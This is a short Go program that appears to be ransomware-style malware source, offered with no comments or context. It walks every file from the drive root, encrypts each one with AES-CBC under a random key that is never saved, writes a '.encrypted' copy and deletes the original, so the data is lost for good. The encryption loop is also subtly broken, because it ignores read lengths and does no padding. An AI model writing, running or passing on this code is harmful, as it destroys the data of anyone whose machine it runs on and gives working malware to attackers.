package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"
)

func main() {
	root := "\\"
	filepath.WalkDir(root, visitFile)
}

func visitFile(path string, info os.DirEntry, err error) error {
	if err != nil {
		fmt.Printf("%v\n", err)
		return nil
	}
	if info.IsDir() {
		return nil
	}
	encryptFile(path)
	return nil
}

func encryptFile(path string) {

	file, err := os.Open(path)
	if err != nil {
		log.Fatal(err)
	}
	defer os.Remove(path)
	defer file.Close()

	key := make([]byte, 32)
	_, err = rand.Read(key)
	if err != nil {
		log.Fatal(err)
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		log.Fatal(err)
	}

	iv := make([]byte, aes.BlockSize)
	_, err = rand.Read(iv)
	if err != nil {
		log.Fatal(err)
	}

	ciphertextFile, err := os.Create(path + ".encrypted")
	if err != nil {
		log.Fatal(err)
	}
	defer ciphertextFile.Close()

	_, err = ciphertextFile.Write(iv)
	if err != nil {
		log.Fatal(err)
	}

	ciphertext := cipher.NewCBCEncrypter(block, iv)

	plaintext := make([]byte, aes.BlockSize)
	buffer := make([]byte, aes.BlockSize)
	for {
		_, err := file.Read(plaintext)
		if err == io.EOF {
			break
		}
		ciphertext.CryptBlocks(buffer, plaintext)
		_, err = ciphertextFile.Write(buffer)
		if err != nil {
			log.Fatal(err)
		}
	}
}
